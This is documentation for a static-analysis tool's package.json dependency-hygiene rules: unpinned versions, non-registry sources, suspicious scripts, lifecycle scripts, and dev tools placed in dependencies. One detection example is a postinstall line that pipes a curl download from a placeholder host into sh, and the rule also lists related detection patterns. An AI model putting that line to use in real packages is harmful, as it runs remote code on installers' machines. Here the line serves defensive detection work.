# Dependency hygiene (`package.json`) — `dependency-hygiene.ts`

Source: [`src/lib/analysis/rules/dependency-hygiene.ts`](../../src/lib/analysis/rules/dependency-hygiene.ts) · Tests: [`tests/rules/dependency-hygiene.test.ts`](../../tests/rules/dependency-hygiene.test.ts) · Category: `dependency-hygiene`

**Explicitly not CVE/vulnerability scanning** — there is no offline advisory database integrated, and nothing here claims to know whether any specific package version has a known security hole. JSON-based, not AST — the input isn't JavaScript at all, so this is the same architectural style as `html.ts` (text/JSON pattern checks). Analyzed via the checker's `package.json` mode.

Also **not implemented, deliberately**: missing-lockfile detection. This tool only ever sees pasted text — if a user doesn't paste a `package-lock.json`, that's indistinguishable from "doesn't have one," too weak and potentially misleading a signal to report as a finding.

---

## dep-unpinned-version

**What it flags:** A dependency version declared as exactly `"*"`, `"x"`, or `"latest"` (case-insensitive), in any dependency block.

**Severity:** High.

**Risky example:** `"dependencies": { "express": "*" }`

**Safe example:** `"dependencies": { "lodash": "^4.17.21" }`

**Limitations:** Presence check on the declared range only — does not verify what version is actually installed, and cannot see a lockfile (this tool only analyzes pasted text).

**Tests:** `tests/fixtures/vulnerable/dep-hygiene-unpinned-wildcard.ts`, `dep-hygiene-unpinned-latest.ts` · `tests/fixtures/safe/dep-hygiene-properly-pinned-safe.ts`

---

## dep-non-registry-source

**What it flags:** A dependency version starting with `git+`, `git://`, `http://`, `https://`, `github:`, `gitlab:`, `bitbucket:`, or `file:` — resolved from outside the npm registry.

**Severity:** Medium.

**Risky example:** `"dependencies": { "some-fork": "git+https://github.com/someuser/some-fork.git" }`

**Limitations:** Format match on the version string only — does not evaluate whether the actual source is trustworthy. A git/URL dependency is sometimes a genuinely intentional choice (an internal private package) — see `tests/independent-benchmark/samples/backend-service-package.json` for a realistic example where this flag is a defensible, not clear-cut, call.

**Tests:** `tests/fixtures/vulnerable/dep-hygiene-git-dependency.ts` · `tests/independent-benchmark/samples/backend-service-package.json`

---

## dep-suspicious-script-content

**What it flags:** Any `scripts` entry whose value matches a pattern seen in real npm supply-chain attacks: piping a remote download (`curl`/`wget`) into a shell (`sh`/`bash`/`zsh`), a `base64 -d`/`--decode` step, `node -e`, or a dynamic `eval(`.

**Severity:** Critical — the closest thing in this rule group to an active-compromise indicator.

**Risky example:** `"scripts": { "postinstall": "curl http://example.com/payload.sh | sh" }`

**Limitations:** Pattern match on the script's text only — cannot execute or understand the script. A legitimate script could coincidentally match (rare), and a malicious one could avoid every pattern checked here.

**Tests:** `tests/fixtures/vulnerable/dep-hygiene-suspicious-postinstall.ts`

---

## dep-lifecycle-script-present

**What it flags:** Presence of a `preinstall`, `install`, `postinstall`, or `prepare` script — informational only. The large majority of these are completely legitimate (native module builds, git hooks via husky); this exists purely to surface "code runs automatically here," not to accuse anything.

**Severity:** Info.

**Risky (informational) example:** `"scripts": { "postinstall": "husky install" }` — flagged as info-only, explicitly *not* the suspicious-pattern check above; this fixture exists specifically to prove the two checks are properly distinct, not the same finding at two severities.

**Limitations:** Presence check only.

**Tests:** `tests/fixtures/edge-cases/dep-hygiene-ordinary-postinstall-not-suspicious.ts` · `tests/independent-benchmark/samples/backend-service-package.json`

---

## dep-devtool-in-dependencies

**What it flags:** A well-known development-tool package name (a linter, test runner, bundler, `@types/*`, etc.) declared in `dependencies` instead of `devDependencies`. Name-pattern only — this engine analyzes one pasted file, not a whole repository, so it cannot check actual usage.

**Severity:** Low.

**Risky example:** `"dependencies": { "eslint": "^9.0.0" }`

**Safe example:** `"devDependencies": { "vitest": "^3.0.0" }` — correctly placed, NOT flagged (the check only examines the `dependencies` block).

**Limitations:** Can miss a real dev-only dependency under an unrecognized name, and can occasionally flag a package that genuinely is needed at runtime — see `tests/independent-benchmark/samples/backend-service-package.json`'s `typescript`-in-`dependencies` case, included deliberately as a realistic example of this heuristic making a defensible-but-debatable call, not only showing clean wins.

**Tests:** `tests/fixtures/vulnerable/dep-hygiene-devtool-in-dependencies.ts` · `tests/fixtures/safe/dep-hygiene-devtool-correctly-placed-safe.ts` · `tests/independent-benchmark/samples/backend-service-package.json`
